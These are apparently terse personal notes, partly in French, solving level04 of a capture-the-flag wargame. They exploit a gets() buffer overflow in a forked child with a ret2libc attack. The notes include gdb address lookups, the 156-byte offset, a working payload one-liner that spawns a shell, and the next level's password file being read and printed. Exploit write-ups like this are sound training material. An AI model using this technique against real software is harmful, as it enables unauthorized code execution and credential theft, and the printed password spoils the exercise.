le program fork
    pid = fork();

dans le child il y a un buffer overflow:
    gets((char *)buffer);

start buffer: 0xffffd520 ; $sp+32
saved ebp: 0xffffd5b8 ; $sp+184
saved eip: 0xffffd5bc ; $sp+188

donc 188-32=156

python -c 'print "A"*156 + "EIP ADDRESS"'

the parent with ptrace block the call to exec with ptrace

on test un ret2libc

il nous faut l'address de system exit and "/bin/sh"


(gdb) info function system
All functions matching regular expression "system":

Non-debugging symbols:
...
0xf7e6aed0  system


(gdb) info function exit
All functions matching regular expression "exit":

Non-debugging symbols:
0xf7e5eb70  exit


(gdb) info proc map
process 2486
Mapped address spaces:

    Start Addr   End Addr       Size     Offset objfile
    ...
    0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so

(gdb) find 0xf7e2c000,0xf7fcc000,"/bin/sh"
0xf7f897ec

on remplace le saved eip par l'address de system() on lui donne comme argumwnt l'address de "/bin/sh" et on fait execute exit() apres system()

python -c 'print "A"*156 + "ADDRESS of system()" + "ADDRESS of exit()" + "ADDRESS of "/bin/sh""'

$> python -c 'print "A"*156 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7"' > /tmp/level04_overflow

$> cat /tmp/level04_overflow - | ./level04
Give me some shellcode, k
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
